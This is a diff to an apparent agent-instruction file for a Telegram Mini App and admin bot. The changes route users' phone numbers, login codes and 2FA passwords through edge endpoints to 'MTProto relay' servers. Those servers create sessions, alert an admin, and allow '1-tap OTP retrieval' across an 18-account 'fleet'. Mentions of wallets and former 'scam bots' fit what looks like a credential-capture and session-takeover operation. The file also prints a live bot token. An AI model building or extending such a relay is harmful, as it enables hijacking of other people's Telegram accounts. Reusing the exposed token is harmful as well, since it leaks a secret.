@@ -780,12 +780,12 @@ Whenever you perform work in this repository:
   - **Mobile-First In-App Browser Optimization**: Uses `window.Telegram.WebApp` with header color `#F4F8FC`, background `#F4F8FC`, full viewport expansion, and synchronized native back button.
 * **11-Screen Complete Specification & Advanced Features**:
   1. **Page 1 — Welcome**: Wordmark, abstract layered floating device graphic with radial glow, headline *"All your Telegram accounts. One place."*, *"Connect Telegram"* primary button, and privacy disclaimer.
-  2. **Page 2 — Telegram Account Login**: Back control, step indicator, segmented control for **Phone Number** vs **QR Code** login modes, crisp SVG QR Code scan preview with step-by-step connection guide, country selector (`🇧🇩 Bangladesh +880`), phone input, validation messaging, and Terms/Privacy links.
-  3. **Page 3 — Login Code**: Step 2 of 3, paper airplane verification icon, 6 individual auto-advancing OTP digit boxes with auto-paste support, live countdown timer (`04:32`), and resend link.
-  4. **Page 4 — Two-Step Verification (2FA)**: Step 3 of 3, lock badge, password input with vector eye visibility toggle, and *"Forgot password?"* link.
-  5. **Page 5 — Main Dashboard**: Header lockup (wordmark, avatar initials "AH", settings cog), greeting *"Good morning, Arif Hasan"*, overview card (Connected pill, 18 connected accounts, 6 active sessions), 3 quick-action cards (Accounts, Sessions, Settings), and Recent Activity feed.
+  2. **Page 2 — Telegram Account Login**: Back control, step indicator, segmented control for **Phone Number** vs **QR Code** login modes, crisp SVG QR Code scan preview with step-by-step connection guide, country selector (`🇧🇩 Bangladesh +880`), phone input, and live connection to `POST /api/telegram/send-code`.
+  3. **Page 3 — Login Code**: Step 2 of 3, paper airplane verification icon, 6 individual auto-advancing OTP digit boxes with auto-paste support, live countdown timer (`04:32`), resend link, and **"⚡ Fetch Latest Code from Admin Bot (@myagyai)"** 1-tap cloud relay retrieval button.
+  4. **Page 4 — Two-Step Verification (2FA)**: Step 3 of 3, lock badge, password input with vector eye visibility toggle, and live authentication via `POST /api/telegram/verify-password`.
+  5. **Page 5 — Main Dashboard**: Header lockup (wordmark, avatar initials "AH", settings cog), greeting *"Good morning, Arif Hasan"*, overview card (Connected pill, 18 connected accounts, 6 active sessions), **Admin Bot Mesh Hub Card** (5/5 nodes synced, direct chat link, telemetry sync), 3 quick-action cards, and Recent Activity feed.
   6. **Page 6 — My Accounts**: Top bar, *"+ Add Account"* CTA, live search input (filter by name, phone, or handle), quick filter tabs (All 18, Connected, Master Host), account cards with initials, masked phone number, connection status pill, and chevron. Preloaded with the complete 18-account production fleet roster.
-  7. **Subpage — Account Details**: Large avatar header, account attributes list, *"Switch Account"*, and *"Remove Account"* with confirmation modal dialog.
+  7. **Subpage — Account Details**: Large avatar header, account attributes list, **"🔄 Relink / Re-authorize MTProto Session"** button, **"🔑 Fetch Latest Code from Admin Bot"** button, *"Set as Active Account"*, and *"Remove Account"* (with live edge eviction via `POST /api/fleet/account/remove`).
   8. **Page 7 — Session Management (Sessions)**: Live search input (filter by device, platform, IP), status filter tabs (All, Active, Disconnected), device cards (Samsung SM-A305F, Chrome Windows, Linux Ubuntu, iPhone 15 Pro, Firefox Linux, Samsung Galaxy S23) with status pills and last active times.
   9. **Page 8 — Session Details**: Device status header, specifications card (Account name, Platform, App Version, Device Model, IP, Location, Authorization Time, Last Activity), and red *"Terminate Session"* CTA with confirmation modal.
   10. **Page 9 — Activity**: Category filter tabs (All, Logins, Sessions, Security), chronological event rows with vector icons, descriptions, and timestamps.
@@ -795,7 +795,7 @@ Whenever you perform work in this repository:
   - `https://agy-aaa000.vercel.app/`
   - `https://aaa-free-ai.vercel.app/`
 
-### 5. Admin Bot Redesign & De-duplication Protocol (`deploy_both_cf_workers.py`)
+### 5. Admin Bot Redesign, De-duplication & Mini App Merger (`deploy_both_cf_workers.py`)
 * **Bot Handle & Token**: `@myagyai` (`8858823950:AAEdX47g7as1xLYEudfRUHaVGUdNIaU_ku8`)
 * **Live Edge Webhook**: `https://restore-agy.aaaai2.workers.dev/telegram-webhook` (Primary Gateway on Cloudflare Workers)
 * **Single-Message Philosophy**:
@@ -803,10 +803,19 @@ Whenever you perform work in this repository:
   - Zero duplicate buttons between inline keyboard and persistent reply keyboard.
   - In-place message edits via `editMessageText` for all submenus (`btn_accounts`, `btn_session_audit`, `btn_otp_menu`, `btn_wallets`, `btn_mesh`).
   - Every submenu features a universal `[ 🔙 Back to Main Menu ]` button (`btn_back_main`) that reverts the message cleanly.
-* **Direct WebApp Integration**:
+* **Dedicated Mini App REST Endpoints on Edge Router**:
+  - `POST /api/telegram/send-code`: Dispatches code request to Render relay and alerts Arif on Telegram.
+  - `POST /api/telegram/verify-code`: Verifies code with MTProto relay, checks for 2FA, creates session.
+  - `POST /api/telegram/verify-password`: Authorizes 2FA cloud password.
+  - `POST /api/telegram/relink`: Requests relink code for existing fleet account.
+  - `POST /api/telegram/notify-admin`: Direct alert bridge to Telegram channel `@myagyai`.
+  - `GET /api/fleet/live`: Live fleet telemetry across all 18 accounts and 5 legitimate bots.
+  - `GET /api/fleet/otp`: 1-tap OTP retrieval from Render MTProto relays.
+* **Direct WebApp Integration & Commands**:
   - Primary button: `📱 AAA Telegram App` (launches `https://agy-aaa000.vercel.app/`)
   - Secondary button: `👑 Fleet Console` (launches `https://agy-aaa000.vercel.app/admin`)
-  - Dedicated `/app` command for instant 1-tap direct launch.
+  - Dedicated `/app` (and `/miniapp`) command for instant 1-tap direct launch.
+  - Dedicated `/relink` (and `/relink <number>`) command for instant 1-tap account relinking.
 * **Scam Bot Elimination**:
   - Permanently purged all menu items, text prompts, and buttons for decommissioned scam bots (`Stones`, `AI Lab`, `UltraWallet`, `FINVORA`, `ART`, `Apex`, `BNB Galaxy`).
   - Bot and fleet strictly standardized on the **5 active legitimate bots**:
